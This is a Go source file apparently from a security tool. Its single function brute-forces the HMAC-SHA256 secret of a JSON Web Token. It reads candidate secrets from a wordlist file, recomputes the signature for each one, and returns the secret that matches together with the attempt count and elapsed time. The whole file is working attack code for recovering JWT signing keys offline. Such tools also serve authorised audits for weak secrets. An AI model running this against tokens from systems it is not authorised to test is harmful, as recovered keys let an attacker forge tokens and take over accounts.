package internal

import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"os"
	"strings"
	"time"
)

type BruteforceResult struct {
	Secret   string
	Tried    int
	Duration time.Duration
}

// TODO: check alg
func Bruteforce(_jwt string, wordlist_path string) (BruteforceResult, error) {
	jwt := strings.TrimSpace(_jwt)

	parts := strings.Split(jwt, ".")
	if len(parts) != 3 {
		return BruteforceResult{}, errors.New("invalid JWT: expected 3 parts separated by '.'")
	}

	signatureBytes, err := base64.RawURLEncoding.DecodeString(parts[2])
	if err != nil {
		return BruteforceResult{}, errors.New("invalid JWT: failed to decode signature")
	}

	bytes_to_sign := []byte(parts[0] + "." + parts[1])

	file, err := os.Open(wordlist_path)
	if err != nil {
		return BruteforceResult{}, err
	}
	defer file.Close()

	tried := 0

	scanner := bufio.NewScanner(file)
	start := time.Now()
	for scanner.Scan() {
		possible_secret := scanner.Text()
		tried++

		mac := hmac.New(sha256.New, []byte(possible_secret))
		mac.Write(bytes_to_sign)
		possible_signed_bytes := mac.Sum(nil)

		if bytes.Equal(possible_signed_bytes, signatureBytes) {
			return BruteforceResult{
				Secret:   possible_secret,
				Tried:    tried,
				Duration: time.Since(start),
			}, nil
		}
	}

	return BruteforceResult{
		Secret:   "",
		Tried:    tried,
		Duration: time.Since(start),
	}, nil
}
